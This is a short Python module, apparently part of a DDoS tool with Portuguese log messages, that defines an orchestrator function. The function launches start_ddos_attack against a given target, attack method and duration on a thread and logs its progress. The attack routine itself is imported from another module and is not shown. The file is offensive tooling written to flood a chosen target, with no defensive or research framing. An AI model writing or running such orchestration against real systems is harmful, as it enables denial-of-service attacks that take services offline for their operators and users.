import threading
import logging
from orchestrator.attack import start_ddos_attack

# Configurando o logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def orchestrator(target, attack_method, attack_duration, options=None):
    logging.info(f"Iniciando orquestrador para o alvo: {target} usando o método: {attack_method} com opções: {options}")
    
    try:
        attack_thread = threading.Thread(target=start_ddos_attack, args=(target, attack_method, attack_duration, options))
        attack_thread.start()
        attack_thread.join()
    except Exception as e:
        logging.error(f"Erro ao executar o orquestrador: {e}")
    else:
        logging.info(f"Orquestrador finalizado para o alvo: {target}")
